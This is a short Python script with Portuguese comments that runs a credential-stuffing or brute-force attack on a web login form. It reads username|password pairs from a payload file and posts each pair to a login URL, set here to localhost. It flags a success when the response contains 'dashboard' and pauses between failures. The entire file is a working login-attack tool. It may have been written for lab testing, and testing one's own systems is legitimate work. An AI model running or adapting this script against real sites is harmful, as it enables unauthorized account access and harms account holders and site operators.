# Imports
import requests
from time import sleep
# Classes importadas
class bcolors:
    OK = '\033[92m' #GREEN
    FAIL = '\033[91m' #RED
    
req = requests.session()
url = "http://127.0.0.1/login.php" #Aqui vai a url do site
a = open("payload.txt", "r") #aqui é o txt da payload
stop = "default"
file = [s.rstrip()for s in a.readlines()]
# print(file)
for lines in file:
    combo = lines.split("|")
    param = {
        'username': combo[0],
        'inputpwd': combo[1],#combo[1] ou ''
        'login' : 'login'
    }
    source = req.post(url, data=param)
#         print(source.text)
    if("dashboard"in source.text):
            print(bcolors.OK + "Sucesso!: {}:{}".format(combo[0], combo[1]))

    else: 
        print(bcolors.FAIL + "Username ou senha errados!:  {}:{}".format(combo[0], combo[1]))
        sleep(5)
